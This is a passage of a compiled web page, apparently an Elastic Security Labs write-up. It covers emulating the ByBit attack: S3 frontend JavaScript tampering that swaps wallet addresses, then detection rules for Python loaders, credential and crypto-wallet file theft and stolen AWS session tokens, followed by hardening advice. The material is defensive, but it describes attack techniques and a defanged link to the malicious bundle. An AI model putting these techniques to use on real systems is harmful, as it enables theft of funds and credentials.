\",(0,t.jsx)(e.a,{href:\"https://docs.aws.amazon.com/cli/latest/reference/s3/sync.html\",rel:\"nofollow\",children:\"sync\"}),\" command to download the entire contents, which included the bundled frontend JavaScript assets. Between February 5 and February 19, 2025, they appeared to focus on modifying these assets - specifically, files like \",(0,t.jsx)(e.code,{children:\"main.\u003cHASH\u003e.js\"}),\" and related routes, which are output by \",(0,t.jsx)(e.code,{children:\"Next.js\"}),\" during its build process and stored under the \",(0,t.jsx)(e.code,{children:\"_next/static/chunks/pages/\"}),\" directory. These bundled files contain the transpiled application logic, and according to Sygnia's forensic report, a file named \",(0,t.jsx)(e.code,{children:\"_app-52c9031bfa03da47.js\"}),\" was the primary injection point for the malicious code.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image23.png\",alt:\"Leveraging AWS CLI sync command to download bucket contents\",width:\"1999\",height:\"487\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Next.js applications, when built, typically store their statically generated assets under the \",(0,t.jsx)(e.code,{children:\"next/static/\"}),\" directory, with JavaScript chunks organized into folders like \",(0,t.jsx)(e.code,{children:\"/chunks/pages/\"}),\". In this case, the adversary likely formatted and deobfuscated the JavaScript bundle to understand its structure, then reverse engineered the application logic. After identifying the code responsible for handling user-entered wallet addresses, they injected their \",(0,t.jsx)(e.a,{href:\"%60https%5B:%5D//web%5B.%5Darchive%5B.%5Dorg/web/20250219172905/https%5B:%5D//app%5B.%5Dsafe%5B.%5Dglobal/_next/static/chunks/pages/_app-52c9031bfa03da47%5B.%5Djs%60\",children:\"payload\"}),\". This payload introduced conditional logic: if the entered wallet address matched one of several known target addresses, it would silently replace the destination with a DPRK-controlled address, redirecting funds without the user becoming aware.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image4.png\",alt:\"\",width:\"1999\",height:\"1039\"})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image7.png\",alt:\"Modifying the non-formatted bundled static site code of our own app\",width:\"1562\",height:\"186\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"In our emulation, we replicated this behavior by modifying the \",(0,t.jsx)(e.code,{children:\"TransactionForm.js\"}),\" component to check if the entered recipient address matched specific values. If so, the address was replaced with an attacker-controlled wallet. While this does not reflect the complexity of actual smart contract manipulation or delegate calls used in the real-world attack, it serves as conceptual behavior to illustrate how a compromised frontend could silently redirect cryptocurrency transactions.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image2.png\",alt:\"Our static site frontend script pop-up notifying the target wallet address condition was met after malicious code upload\",width:\"1312\",height:\"1288\"})}),`\n`,(0,t.jsx)(e.h4,{id:\"static-site-tampering-implications-and-missing-security-controls\",children:\"Static Site Tampering Implications and Missing Security Controls\"}),`\n`,(0,t.jsx)(e.p,{children:\"This type of frontend tampering is especially dangerous in Web3 environments, where decentralized applications (dApps) often rely on static, client-side logic to process transactions. By modifying the JavaScript bundle served from the S3 bucket, the attacker was able to subvert the application\\u2019s behavior without needing to breach backend APIs or smart contract logic.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"We assume that protections such as \",(0,t.jsx)(e.a,{href:\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-lock.html\",rel:\"nofollow\",children:\"S3 Object Lock\"}),\", Content-Security-Policy (CSP), or Subresource Integrity (SRI) headers were either not in use or not enforced during the time of compromise. The absence of these controls would have allowed an attacker to modify static frontend code without triggering browser or backend integrity validation, making such tampering significantly easier to carry out undetected.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"lessons-in-defense\",children:\"Lessons in defense\"}),`\n`,(0,t.jsx)(e.p,{children:\"A successful emulation\\u2014or real-world incident response\\u2014doesn\\u2019t end with identifying attacker behaviors. It continues with reinforcing defenses to prevent similar techniques from succeeding again. Below, we outline key detections, security controls, mitigation strategies, and Elastic features that can help reduce risk and limit exposure to the tactics used in this emulation and in-the-wild (ItW) campaigns like the Safe{Wallet} compromise.\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.strong,{children:\"Note:\"}),\" These detections are actively maintained and regularly tuned, and may evolve over time. Depending on your environment, additional tuning may be required to minimize false positives and reduce noise.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"elastics-siem-detection-and-endpoint-prevention-rules\",children:\"Elastic\\u2019s SIEM detection and endpoint prevention rules\"}),`\n`,(0,t.jsx)(e.p,{children:\"Once we understand adversary behavior through emulation and implement security controls to harden the environment, it\\u2019s equally important to explore detection opportunities and capabilities to identify and respond to these threats in real time.\"}),`\n`,(0,t.jsx)(e.p,{children:\"Once we understand adversary behavior through emulation and implement security controls to harden the environment, it\\u2019s equally important to explore detection opportunities and capabilities to identify and respond to these threats in real time.\"}),`\n`,(0,t.jsx)(e.h4,{id:\"macos-endpoint-behavior-prevention-rules\",children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/tree/main/behavior/rules/macos\",rel:\"nofollow\",children:\"MacOS Endpoint Behavior Prevention Rules\"})}),`\n`,(0,t.jsx)(e.h5,{id:\"python-pyyaml-deserialization-payload\",children:\"Python PyYAML Deserialization Payload\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_python_script_drop_and_execute.md\",rel:\"nofollow\",children:\"Python Script Drop and Execute\"}),\"\\u201D:\"]}),\" Detects when a Python script gets created or modified followed immediately by the execution of that script by the same Python process.\"]}),`\n`,(0,t.jsx)(e.h5,{id:\"python-loader-script-1\",children:\"Python Loader Script\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_self_deleting_python_script.md\",rel:\"nofollow\",children:\"Self-Deleting Python Script\"}),\"\\u201D:\"]}),\" Detects when a Python script executes and that script file is immediately deleted by the same Python process.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/84966f02a1b71cce13db22b6c348cb46560529b7/hunting/macos/docs/defense_evasion_self_deleted_python_script_outbound_network_connection.md\",rel:\"nofollow\",children:\"Self-Deleted Python Script Outbound Connection\"}),\"\\u201D:\"]}),\" Detects when a Python script gets deleted and an outbound network connection occurs shortly after by the same Python process.\"]}),`\n`,(0,t.jsx)(e.h5,{id:\"python-loader-script-ret--1\",children:\"Python Loader Script Ret == 1\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/84966f02a1b71cce13db22b6c348cb46560529b7/hunting/macos/docs/command_and_control_suspicious_executable_file_creation_via_python.md\",rel:\"nofollow\",children:\"Suspicious Executable File Creation via Python\"}),\"\\u201D:\"]}),\" Detects when an executable file gets created or modified by Python in suspicious or unusual directories.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_python_library_load_and_delete.md\",rel:\"nofollow\",children:\"Python Library Load and Delete\"}),\"\\u201D:\"]}),\" Detects when a shared library, located within the users home directory, gets loaded by Python followed by the deletion of the library shortly after by the same Python process.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unusual_library_load_via_python.md\",rel:\"nofollow\",children:\"Unusual Library Load via Python\"}),\"\\u201D:\"]}),\" Detects when a shared library gets loaded by Python that does not denote itself as a .dylib or .so file and is located within the users home directory.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/endpoint-rules/blob/13bad7e92e53f078b97bbeb376aedb23797be21b/rules/macos/defense_evasion_potential_in_memory_jxa_load_via_untrusted_or_unsigned_binary.toml\",rel:\"nofollow\",children:\"In-Memory JXA Execution via ScriptingAdditions\"}),\"\\u201D:\"]}),\" Detects the in-memory load and execution of a JXA script.\"]}),`\n`,(0,t.jsx)(e.h5,{id:\"python-loader-script-ret--2\",children:\"Python Loader Script Ret == 2\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/credential_access_potential_python_stealer.md\",rel:\"nofollow\",children:\"Potential Python Stealer\"}),\"\\u201D:\"]}),\" Detects when a Python script gets executed followed shortly after by at least three attempts to access sensitive files by the same Python process.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_self_deleted_python_script_accessing_sensitive_files.md\",rel:\"nofollow\",children:\"Self-Deleted Python Script Accessing Sensitive Files\"}),\"\\u201D:\"]}),\" Detects when a Python script gets deleted and sensitive files are accessed shortly after by the same Python process.\"]}),`\n`,(0,t.jsx)(e.h5,{id:\"python-loader-script-ret--3\",children:\"Python Loader Script Ret == 3\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unsigned_or_untrusted_binary_execution_via_python.md\",rel:\"nofollow\",children:\"Unsigned or Untrusted Binary Execution via Python\"}),\"\\u201D:\"]}),\" Detects when an unsigned or untrusted binary gets executed by Python where the executable is located within a suspicious directory.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unsigned_or_untrusted_binary_fork_via_python.md\",rel:\"nofollow\",children:\"Unsigned or Untrusted Binary Fork via Python\"}),\"\\u201D:\"]}),\" Detects when an unsigned or untrusted binary gets fork exec\\u2019d by Python where the process argument is the path to a file within the users home directory.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/endpoint-rules/blob/13bad7e92e53f078b97bbeb376aedb23797be21b/rules/macos/credential_access_cloud_credential_file_accessed_by_untrusted_or_unsigned_process.toml\",rel:\"nofollow\",children:\"Cloud Credential Files Accessed by Process in Suspicious Directory\"}),\"\\u201D:\"]}),\" Detects when cloud credentials are accessed by a process running from a suspicious directory.\"]}),`\n`,(0,t.jsx)(e.h4,{id:\"siem-detections-for-aws-cloudtrail-logs\",children:\"SIEM Detections for AWS CloudTrail Logs\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/44a2f4c41aa1482ec545f0391040e254c29a8d80/rules/integrations/aws/initial_access_iam_session_token_used_from_multiple_addresses.toml\",rel:\"nofollow\",children:\"STS Temporary IAM Session Token Used from Multiple Addresses\"}),\"\\u201D:\"]}),\" Detects AWS IAM session tokens (e.g. ASIA*) being used from multiple source IP addresses in a short timeframe, which may indicate credential theft and reuse from adversary infrastructure.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2f4a310cc5d75f8d8f2a2d0f5ad5e5a4537e26a3/rules/integrations/aws/persistence_aws_attempt_to_register_virtual_mfa_device.toml\",rel:\"nofollow\",children:\"IAM Attempt to Register Virtual MFA Device with Temporary Credentials\"}),\"\\u201D:\"]}),\" Detects attempts to call CreateVirtualMFADevice or EnableMFADevice with AWS session tokens. This may reflect an attempt to establish persistent access using hijacked short-term credentials.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/b64ecc925304b492d7855d357baa6c68711eef9a/rules/integrations/aws/persistence_iam_sts_api_calls_via_user_session_token.toml\",rel:\"nofollow\",children:\"API Calls to IAM via Temporary Session Tokens\"}),\"\\u201D:\"]}),\" Detects use of sensitive iam.amazonaws.com API operations by a principal using temporary credentials (e.g. session tokens with ASIA* prefix). These operations typically require MFA or should only be performed via the AWS console or federated users. Not CLI or automation tokens.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/29dfe1217d1320ab400d051de377664fdbb09493/rules/integrations/aws/impact_s3_static_site_js_file_uploaded.toml\",rel:\"nofollow\",children:\"S3 Static Site JavaScript File Uploaded via PutObject\"}),\"\\u201D:\"]}),\" Identifies attempts by IAM users to upload or modify JavaScript files in the static/js/ directory of an S3 bucket, which can signal frontend tampering (e.g. injection of malicious code)\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/b35f7366e92321105f61249b233f436c40b59c19/rules/integrations/aws/initial_access_kali_user_agent_detected_with_aws_cli.toml\",rel:\"nofollow\",children:\"AWS CLI with Kali Linux Fingerprint Identified\"}),\"\\u201D:\"]}),\" Detects AWS API calls made from a system using Kali Linux, as indicated by the user_agent.original string. This may reflect attacker infrastructure or unauthorized access from red team tooling.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/aws/queries/s3_public_bucket_rapid_object_access_attempts.toml\",rel:\"nofollow\",children:\"S3 Excessive or Suspicious GetObject Events\"}),\"\\u201D:\"]}),\" Detects a high volume of S3 GetObject actions by the same IAM user or session within a short time window. This may indicate S3 data exfiltration using tools like AWS CLI command \",(0,t.jsx)(e.em,{children:\"sync\"}),\" - particularly targeting static site files or frontend bundles. Note, this is a hunting query and should be adjusted accordingly.\"]}),`\n`,(0,t.jsx)(e.h4,{id:\"siem-detections-for-docker-abuse\",children:\"SIEM Detections for Docker Abuse\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_suspicious_file_access_via_docker.md\",rel:\"nofollow\",children:\"Sensitive File Access via Docker\"}),\"\\u201D:\"]}),\" Detects when Docker accesses sensitive host files (\\u201Cssh\\u201D, \\u201Caws\\u201D, \\u201Cgcloud\\u201D, \\u201Cazure\\u201D, \\u201Cweb browser\\u201D, \\u201Ccrypto wallet files\\u201D).\"]}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsxs)(e.strong,{children:[\"Rule Name: \\u201C\",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_suspicious_executable_file_modification_via_docker.md\",rel:\"nofollow\",children:\"Suspicious Executable File Modification via Docker\"}),\"\\u201D:\"]}),\" Detects when Docker creates or modifies an executable file within a suspicious or unusual directory.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"If your macOS agent policy includes the \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-container\",rel:\"nofollow\",children:\"Docker data integration\"}),\", you can collect valuable telemetry that helps surface malicious container activity on user systems. In our emulation, this integration allowed us to ingest Docker logs (into the metrics index), which we then used to build a detection rule capable of identifying indicators of compromise and suspicious container executions associated with the malicious application.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image17.png\",alt:\"\",width:\"1999\",height:\"123\"})}),`\n`,(0,t.jsx)(e.h2,{id:\"mitigations\",children:\"Mitigations\"}),`\n`,(0,t.jsx)(e.h3,{id:\"social-engineering\",children:\"Social Engineering\"}),`\n`,(0,t.jsx)(e.p,{children:\"Social engineering plays a major role in many intrusions, but especially with the DPRK. They are highly adept at targeting and approaching their victims utilizing trusted public platforms like LinkedIn, Telegram, X or Discord to initiate contact and appear legitimate. Many of their social engineering campaigns attempt to convince the user to download and execute some kind of project, application or script whether it be out of necessity (job application), distress (debugging assistance) etc.. Mitigation of targeting that leverage social engineering is difficult and takes a concerted effort by a company to ensure their employees are regularly trained to recognize these attempts, applying the proper skepticism and caution when engaging outside entities and even the open source communities.\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsx)(e.li,{children:\"User Awareness Training\"}),`\n`,(0,t.jsx)(e.li,{children:\"Manual Static Code Review\"}),`\n`,(0,t.jsx)(e.li,{children:\"Static Code and Dependency Scanning\"}),`\n`]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Bandit (\",(0,t.jsx)(e.a,{href:\"https://github.com/PyCQA/bandit\",rel:\"nofollow\",children:\"GitHub - PyCQA/bandit: Bandit is a tool designed to find common security issues in Python code.\"}),\") is a great example of an open source tool a developer could use to scan the Python application and its scripts prior to execution in order to surface common Python security vulnerabilities or dangerous issues that may be present in the code.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image19.png\",alt:\"\",width:\"1910\",height:\"1418\"})}),`\n`,(0,t.jsx)(e.h3,{id:\"application-and-device-management\",children:\"Application and Device Management\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Application controls via a device management solution or a binary authorization framework like the open source tool Santa (\",(0,t.jsx)(e.a,{href:\"https://github.com/northpolesec/santa\",rel:\"nofollow\",children:\"GitHub - northpolesec/santa: A binary and file access authorization system for macOS.\"}),\") could have been used to enforce notarization and block execution from suspicious paths. This would have prevented the execution of the Poseidon payload dropped to the system for persistence, and could have prevented access to sensitive files.\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"edrxdr\",children:\"EDR/XDR\"}),`\n`,(0,t.jsx)(e.p,{children:\"To effectively defend against nation-state threats\\u2014and the many other attacks targeting macOS\\u2014it's critical to have an EDR solution in place that provides rich telemetry and correlation capabilities to detect and prevent script-based attacks. Taking it a step further, an EDR platform like Elastic allows you to ingest AWS logs alongside endpoint data, enabling unified alerting and visibility through a single pane of glass. When combined with AI-powered correlation, this approach can surface cohesive attack narratives, significantly accelerating response and improving your ability to act quickly if such an attack occurs.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image3.png\",alt:\"Elastic Alerts Dashboard\",width:\"1999\",height:\"736\"})}),`\n`,(0,t.jsx)(e.h3,{id:\"aws-credential-exposure-and-session-token-hardening\",children:\"AWS Credential Exposure and Session Token Hardening\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"In this attack, the adversary leveraged a stolen AWS user session token (with the ASIA* prefix), which had been issued via the GetSessionToken API using MFA. These credentials were likely retrieved from the macOS developer environment \\u2014 either from exported environment variables or default AWS config paths (e.g., \",(0,t.jsx)(e.code,{children:\"~/.aws/credentials\"}),\").\"]}),`\n`,(0,t.jsx)(e.p,{children:\"To mitigate this type of access, organizations can implement the following defensive strategies:\"}),`\n`,(0,t.jsxs)(e.ol,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"Reduce Session Token Lifetimes and Move Away from IAM Users\"}),\": Avoid issuing long-lived session tokens to IAM users. Instead, enforce short token durations (e.g., 1 hour or less) and adopt AWS SSO (IAM Identity Center) for all human users. This makes session tokens ephemeral, auditable, and tied to identity federation. Disabling sts:GetSessionToken permissions for IAM users altogether is the strongest approach, and IAM Identity Center allows this transition.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"Enforce Session Context Restrictions for IAM API Usage\"}),\": Implement IAM policy condition blocks that explicitly deny sensitive IAM operations, such as \",(0,t.jsx)(e.em,{children:\"iam:CreateVirtualMFADevice\"}),\" or \",(0,t.jsx)(e.em,{children:\"iam:AttachUserPolicy\"}),\", if the request is made using temporary credentials. This ensures that session-based keys, such as those used in the attack, cannot escalate privileges or modify identity constructs.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"Limit MFA Registration to Trusted Paths\"}),\": Block MFA device creation (\",(0,t.jsx)(e.em,{children:\"CreateVirtualMFADevice\"}),\", \",(0,t.jsx)(e.em,{children:\"EnableMFADevice\"}),\") via session tokens unless coming from trusted networks, devices, or IAM roles. Use \",(0,t.jsx)(e.em,{children:\"aws:SessionToken\"}),\" or \",(0,t.jsx)(e.em,{children:\"aws:ViaAWSService\"}),\" as policy context keys to enforce this. This would have prevented the adversary from attempting MFA-based persistence using the hijacked session.\"]}),`\n`]}),`\n`,(0,t.jsx)(e.h3,{id:\"s3-application-layer-hardening-frontend-tampering\",children:\"S3 Application Layer Hardening (Frontend Tampering)\"}),`\n`,(0,t.jsx)(e.p,{children:\"After obtaining the AWS session token, the adversary did not perform any IAM enumeration \\u2014 instead, they pivoted quickly to S3 operations. Using the AWS CLI and temporary credentials, they listed S3 buckets and modified static frontend JavaScript hosted on a public S3 bucket. This allowed them to replace the production Next.js bundle with a malicious variant designed to redirect transactions based on specific wallet addresses.\"}),`\n`,(0,t.jsx)(e.p,{children:\"To prevent this type of frontend tampering, implement the following hardening strategies:\"}),`\n`,(0,t.jsxs)(e.ol,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"Enforce Immutability with S3 Object Lock\"}),\": Enable S3 Object Lock in compliance or governance mode on buckets hosting static frontend content. This prevents overwriting or deletion of files for a defined retention period - even by compromised users. Object Lock adds a strong immutability guarantee and is ideal for public-facing application layers. Access to put new objects (rather than overwrite) can still be permitted via deployment roles.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"Implement Content Integrity with Subresource Integrity (SRI)\"}),\": Include SRI hashes (e.g., SHA-256) in the \u003cscript\u003e tags within index.html to ensure the frontend only executes known, validated JavaScript bundles. In this attack, the lack of integrity checks allowed arbitrary JavaScript to be served and executed from the S3 bucket. SRI would have blocked this behavior at the browser level.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"Restrict Upload Access Using CI/CD Deployment Boundaries\"}),\": Developers should never have direct write access to production S3 buckets. Use separate AWS accounts or IAM roles for development and CI/CD deployment. Only OIDC-authenticated GitHub Actions or trusted CI pipelines should be permitted to upload frontend bundles to production buckets. This ensures human credentials, even if compromised, cannot poison production.\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.strong,{children:\"Lock Access via CloudFront Signed URLs or Use S3 Versioning\"}),\": If the frontend is distributed via CloudFront, restrict access to S3 using signed URLs and remove public access to the S3 origin. This adds a proxy and control layer. Alternatively, enable S3 versioning and monitor for overwrite events on critical assets (e.g., /static/js/*.js). This can help detect tampering by adversaries attempting to replace frontend files.\"]}),`\n`]}),`\n`,(0,t.jsx)(e.h2,{id:\"attack-discovery-ad\",children:\"Attack Discovery (AD)\"}),`\n`,(0,t.jsx)(e.p,{children:\"After completing the end-to-end attack emulation, we tested Elastic\\u2019s new AI Attack Discovery feature to see if it could connect the dots between the various stages of the intrusion. Attack Discovery integrates with an LLM of your choice to analyze alerts across your stack and generate cohesive attack narratives. These narratives help analysts quickly understand what happened, reduce response time, and gain high-level context. In our test, it successfully correlated the endpoint compromise with the AWS intrusion, providing a unified story that an analyst could use to take informed action.\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image10.png\",alt:\"Elastic Attack Discovery\",width:\"1999\",height:\"879\"})}),`\n`,(0,t.jsx)(e.h2,{id:\"osquery\",children:\"OSQuery\"}),`\n`,(0,t.jsx)(e.p,{children:\"When running Elastic Defend through Elastic Agent, you can also deploy the OSQuery Manager integration to centrally manage Osquery across all agents in your Fleet. This enables you to query host data using distributed SQL. During our testing of the Dockerized malicious application, we used OSQuery to inspect the endpoint and successfully identified the container running with privileged permissions.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:\"language-sql\",children:`SELECT name, image, readonly_rootfs, privileged FROM docker_containers\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/bit-bybit/image18.png\",alt:\"Elastic OSQuery Live Query\",width:\"1999\",height:\"683\"})}),`\n`,(0,t.jsx)(e.p,{children:\"We scheduled this query to run on a recurring basis, sending results back to our Elastic Stack. From there, we built a threshold-based detection rule that alerts whenever a new privileged container appears on a user\\u2019s system and hasn\\u2019t been observed in the past seven days.\"}),`\n`,(0,t.jsx)(e.h2,{id:\"conclusion\",children:\"Conclusion\"}),`\n`,(0,t.jsx)(e.p,{children:\"The ByBit attack was one of the most consequential intrusions attributed to DPRK threat actors\\u2014and thanks to detailed reporting and available artifacts, it also provided a rare opportunity for defenders to emulate the full attack chain end to end. By recreating the compromise of a SAFE developer\\u2019s macOS workstation\\u2014including initial access, payload execution, and AWS pivoting\\u2014we validated our detection capabilities against real-world nation-state tradecraft.\"}),`\n`,(0,t.jsx)(e.p,{children:\"This emulation not only highlighted technical insights\\u2014like how PyYAML deserialization can be abused to gain initial access\\u2014but also reinforced critical lessons in operational defense: the value of user awareness, behavior-based EDR coverage, secure developer workflows, effective cloud IAM policies, cloud logging and holistic detection/response across platforms.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Adversaries are innovating constantly, but so are defenders\\u2014and this kind of research helps tip the balance. We encourage you to follow \",(0,t.jsx)(e.a,{href:\"https://x.com/elasticseclabs\",rel:\"nofollow\",children:\"@elasticseclabs\"}),\" and check out our threat research at \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs\",rel:\"nofollow\",children:\"elastic.co/security-labs\"}),\" to stay ahead of evolving adversary techniques.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Resources:\"}),`\n`,(0,t.jsxs)(e.ol,{children:[`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/\",rel:\"nofollow\",children:\"Bybit \\u2013 What We Know So Far\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://x.com/safe/status/1897663514975649938\",rel:\"nofollow\",children:'Safe.eth on X: \"Investigation Updates and Community Call to Action\"'})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://slowmist.medium.com/cryptocurrency-apt-intelligence-unveiling-lazarus-groups-intrusion-techniques-a1a6efda7d34\",rel:\"nofollow\",children:\"Cryptocurrency APT Intelligence: Unveiling Lazarus Group\\u2019s Intrusion Techniques\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/\",rel:\"nofollow\",children:\"Slow Pisces Targets Developers With Coding Challenges and Introduces New Customized Python Malware\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/dprk-code-of-conduct\",rel:\"nofollow\",children:\"Code of Conduct: DPRK\\u2019s Python-fueled intrusions into secured networks\"})}),`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn\",rel:\"nofollow\",children:\"Elastic catches DPRK passing out KANDYKORN\"})}),`\n`]})]})}function k(i={}){let{wrapper:e}=i.components||{};return e?(0,t.jsx)(e,Object.assign({},i,{children:(0,t.jsx)(d,i)})):d(i)}var S=k;return w(A);})();\n;return Component;"},"_id":"articles/bit-bybit.mdx","_raw":{"sourceFilePath":"articles/bit-bybit.mdx","sourceFileName":"bit-bybit.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/bit-bybit"},"type":"Article","imageUrl":"/assets/images/bit-bybit/bit-bybit.jpg","readingTime":"40 min read","series":"","url":"/bit-bybit","headings":[{"level":2,"title":"Key takeaways","href":"#key-takeaways"},{"level":2,"title":"Introduction","href":"#introduction"},{"level":2,"title":"Chronology of events","href":"#chronology-of-events"},{"level":2,"title":"Assumptions for 